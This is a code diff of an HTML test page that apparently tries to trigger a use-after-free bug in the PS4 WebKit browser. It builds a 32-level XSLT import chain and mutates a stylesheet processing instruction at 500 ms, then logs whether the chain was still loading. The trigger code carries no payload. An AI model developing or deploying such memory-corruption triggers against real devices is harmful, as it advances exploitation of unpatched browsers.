@@ -1,43 +1,42 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
 
-<title>PS4 WebKit XSLT UAF - Static V2</title>
+<title>PS4 WebKit XSLT V3 - Import Chain Timing</title>
 
 <style>
 body {
     font-family: Arial, sans-serif;
-    margin: 20px;
     background: #111;
     color: #ddd;
+    margin: 20px;
 }
 
 h2 {
-    font-size: 22px;
+    margin-bottom: 10px;
+}
+
+#status {
+    border: 1px solid #777;
+    padding: 10px;
+    margin-bottom: 15px;
+    font-family: monospace;
 }
 
 #log {
-    white-space: pre-wrap;
-    font-family: monospace;
     background: #000;
     border: 1px solid #777;
     padding: 12px;
-    min-height: 300px;
+    white-space: pre-wrap;
+    font-family: monospace;
+    min-height: 330px;
 }
 
 iframe {
-    display: block;
     width: 100%;
     height: 150px;
     margin-top: 15px;
-    border: 1px solid #777;
-}
-
-.ok {
-    margin-top: 15px;
-    padding: 10px;
     border: 1px solid #777;
 }
 </style>
@@ -45,93 +44,112 @@ iframe {
 
 <body>
 
-<h2>PS4 WebKit XSLT Static V2</h2>
+<h2>PS4 WebKit XSLT V3</h2>
+
+<div id="status">
+    32-level XSLT import chain
+</div>
 
 <div id="log"></div>
 
-<div class="ok">
-    Initial XSLT chain:
-    target.xml → root.xsl → child.xsl → grandchild.xsl
-</div>
-
-<iframe
-    id="f"
-    src="resources/target.xml">
-</iframe>
+<iframe id="f" src="resources/target.xml"></iframe>
 
 <script>
 
 (function () {
 
+    var start = Date.now();
+
     var logBox = document.getElementById("log");
     var frame = document.getElementById("f");
 
-    var start = Date.now();
+    var iframeLoaded = false;
+    var triggerExecuted = false;
 
     function elapsed() {
-        return (Date.now() - start) + "ms";
+        return Date.now() - start;
     }
 
     function log(message) {
         logBox.textContent +=
-            "[" + elapsed() + "] " + message + "\n";
+            "[" + elapsed() + "ms] " + message + "\n";
     }
 
     /*
-     * We deliberately do NOT wait for iframe.onload.
-     *
-     * The original WebKit test also performs the operation
-     * after a fixed 500 ms delay rather than waiting for the
-     * stylesheet chain to finish.
+     * Record the exact moment when the XML navigation
+     * finishes.
      */
+    frame.onload = function () {
+
+        iframeLoaded = true;
+
+        log("================================");
+        log("IFRAME LOAD EVENT");
+        log("XML/XSLT navigation completed.");
+        log("Total load time: " + elapsed() + "ms");
+
+        if (elapsed() <= 500) {
+            log("RESULT: chain completed before 500ms.");
+        } else {
+            log("RESULT: chain completed AFTER 500ms.");
+            log("This is the timing condition we are looking for.");
+        }
+
+        log("================================");
+    };
 
     log("Test started.");
 
     log("Loading target.xml");
 
-    log("Expected stylesheet chain:");
-    log("  target.xml");
-    log("      -> root.xsl");
-    log("          -> child.xsl");
-    log("              -> grandchild.xsl");
+    log("XSLT chain:");
+
+    log("target.xml");
+    log("  -> root.xsl");
+
+    for (var i = 1; i <= 32; i++) {
+
+        var n = (i < 10 ? "0" + i : String(i));
+
+        log("      -> child-" + n + ".xsl");
+    }
+
+    log("");
+    log("Waiting for the 500ms trigger...");
 
     /*
-     * Useful diagnostic only.
+     * 500ms trigger.
      *
-     * If iframe.onload happens before 500 ms, the chain has
-     * probably already completed before our trigger.
-     */
-
-    frame.onload = function () {
-        log("iframe load event fired.");
-        log("The XML document/navigation completed.");
-    };
-
-    /*
-     * 500 ms trigger.
+     * We intentionally do NOT replace the stylesheet.
      *
-     * This is intentionally kept close to the original
+     * We only perform the same ProcessingInstruction
+     * insertion/removal operation used in the original
      * LayoutTest.
      */
 
     setTimeout(function () {
 
-        log("500 ms trigger reached.");
+        triggerExecuted = true;
+
+        log("");
+        log("========== 500ms TRIGGER ==========");
 
         try {
 
             var doc = frame.contentDocument;
 
             if (!doc) {
-                log("ERROR: contentDocument is null.");
+
+                log("contentDocument is NULL.");
+                log("Unable to perform trigger.");
+
                 return;
             }
 
             log("contentDocument obtained.");
 
             /*
-             * Create exactly the type of ProcessingInstruction
-             * used by the original test.
+             * Create embedded stylesheet PI.
              */
 
             var pi = doc.createProcessingInstruction(
@@ -139,10 +157,10 @@ iframe {
                 'type="text/xsl" href="#x"'
             );
 
-            log("xml-stylesheet ProcessingInstruction created.");
+            log("ProcessingInstruction created.");
 
             /*
-             * Insert before the first child.
+             * Insert it at the beginning of the XML document.
              */
 
             doc.insertBefore(pi, doc.firstChild);
@@ -157,77 +175,110 @@ iframe {
 
             log("ProcessingInstruction removed.");
 
-            log("500 ms trigger completed.");
+            log("500ms trigger completed.");
 
-        } catch (e) {
+            /*
+             * Critical diagnostic.
+             */
 
-            log("Exception during trigger:");
-            log(String(e));
+            if (iframeLoaded) {
 
-        }
+                log("IMPORTANT:");
+                log("iframe had ALREADY loaded before trigger.");
 
-    }, 500);
+                log("The XSLT chain was therefore not loading");
+                log("at the moment of the mutation.");
 
-    /*
-     * Diagnostic checkpoints.
-     *
-     * These DO NOT manipulate the stylesheet chain.
-     */
-
-    setTimeout(function () {
-
-        log("1000 ms checkpoint.");
-
-        try {
-
-            var doc = frame.contentDocument;
-
-            if (doc) {
-                log("XML document is still accessible.");
             } else {
-                log("XML document is unavailable.");
+
+                log("IMPORTANT:");
+                log("iframe is STILL loading at 500ms.");
+
+                log("This is the desired timing condition.");
             }
 
         } catch (e) {
 
-            log("1000 ms exception:");
+            log("Exception during 500ms trigger:");
             log(String(e));
-
         }
 
-    }, 1000);
+        log("===================================");
 
-    setTimeout(function () {
-
-        log("2000 ms checkpoint.");
-
-        try {
-
-            var doc = frame.contentDocument;
-
-            if (doc)
-                log("contentDocument still accessible.");
-            else
-                log("contentDocument unavailable.");
-
-        } catch (e) {
-
-            log("2000 ms exception:");
-            log(String(e));
-
-        }
-
-    }, 2000);
+    }, 500);
 
     /*
-     * Same approximate total observation window as the
-     * original test.
+     * 750ms diagnostic.
      */
 
     setTimeout(function () {
 
-        log("3500 ms test completed.");
-        log("Browser is still executing JavaScript.");
+        log("");
+        log("750ms checkpoint.");
+
+        if (iframeLoaded)
+            log("iframe: LOADED");
+        else
+            log("iframe: STILL LOADING");
+
+    }, 750);
+
+    /*
+     * 1000ms diagnostic.
+     */
+
+    setTimeout(function () {
+
+        log("");
+        log("1000ms checkpoint.");
+
+        if (iframeLoaded)
+            log("iframe: LOADED");
+        else
+            log("iframe: STILL LOADING");
+
+    }, 1000);
+
+    /*
+     * 2000ms diagnostic.
+     */
+
+    setTimeout(function () {
+
+        log("");
+        log("2000ms checkpoint.");
+
+        if (iframeLoaded)
+            log("iframe: LOADED");
+        else
+            log("iframe: STILL LOADING");
+
+    }, 2000);
+
+    /*
+     * Final observation.
+     */
+
+    setTimeout(function () {
+
+        log("");
+        log("================================");
+        log("3500ms TEST COMPLETE");
+
+        if (iframeLoaded) {
+
+            log("Browser still running.");
+
+            log("Final iframe state: LOADED");
+
+        } else {
+
+            log("Browser still running.");
+
+            log("Final iframe state: STILL LOADING");
+        }
+
+        log("================================");
 
     }, 3500);
 
